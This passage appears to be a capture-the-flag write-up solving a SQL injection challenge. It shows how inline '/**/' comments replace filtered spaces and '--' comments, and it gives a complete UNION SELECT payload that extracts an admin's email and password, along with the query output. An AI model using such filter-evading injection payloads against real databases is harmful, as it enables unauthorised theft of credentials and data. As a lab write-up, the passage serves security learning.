So we can't do -- comments and no spaces.
Hm.

How about comments?

We have a comment below which is a hint? It also has a \*/ for us

```sql
SELECT username FROM users WHERE ( role = 'USER' AND email LIKE '%@yahoo.com' ) AND ( id > 13.37 AND id <= 3)/* ) LIMIT 0 -- 10
/**
* Set "LIMIT" to 10 when in production
*/
```

Are comments valid token delimiters? Yes they are!

So something like 
```sql
3)/**/UNION/**/SELECT/**/email/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin';/*
```
should work and indeed it does.
Complete payload is:

```sql
3)/**/UNION/**/SELECT/**/email/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin'/**/UNION/**/SELECT/**/password/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin';/*
```

Giving us:
```sql
SELECT username FROM users WHERE ( role = 'USER' AND email LIKE '%@yahoo.com' ) AND ( id > 13.37 AND id <= 3)/**/UNION/**/SELECT/**/email/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin'/**/UNION/**/SELECT/**/password/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin';/* ) LIMIT 0 -- 10
/**
* Set "LIMIT" to 10 when in production
*/
```

```json
[
  {
    "username": "FLAG{Th1s_is_th3_4dm1n_p4ssw0rd}"
  },
  {
    "username": "murphygary@gmail.com"
  }
]
```
